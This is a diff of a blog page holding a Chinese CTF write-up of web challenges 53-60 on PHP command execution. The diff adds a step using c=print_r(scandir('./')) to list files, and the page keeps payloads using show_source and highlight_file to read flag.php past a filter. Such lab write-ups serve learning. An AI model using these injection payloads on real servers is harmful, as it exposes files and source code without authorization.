@@ -36,13 +36,15 @@
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313153611223.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154017552.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154139785.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313215712685.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154353270.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154444430.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154555902.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154720666.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313154831648.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web53-60/file-20250313215107086.png">
 <meta property="article:published_time" content="2025-03-13T05:32:57.000Z">
-<meta property="article:modified_time" content="2025-03-13T07:48:53.517Z">
+<meta property="article:modified_time" content="2025-03-13T14:01:09.803Z">
 <meta property="article:author" content="Y0ungK1ng">
 <meta property="article:tag" content="命令执行">
 <meta name="twitter:card" content="summary">
@@ -114,6 +116,8 @@
     <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/13/web61-68/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2025/03/13/web45-52/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -318,6 +322,8 @@
 <p><img src="/2025/03/13/web53-60/file-20250313154017552.png"></p>
 <p>很明显有后端过滤</p>
 <p><img src="/2025/03/13/web53-60/file-20250313154139785.png"></p>
+<p><code>c=print_r(scandir(&#39;./&#39;));</code><br>可以看路径</p>
+<p><img src="/2025/03/13/web53-60/file-20250313215712685.png"></p>
 <p>使用 show_source 或者 highlight_file，构造 payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
 
@@ -334,6 +340,10 @@
 <p><img src="/2025/03/13/web53-60/file-20250313154831648.png"></p>
 <p>使用 show_source 或者 highlight_file，构造 payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/13/web53-60/file-20250313215107086.png"></p>
+<p>同样处理</p>
+
   </div>
 </article>
 
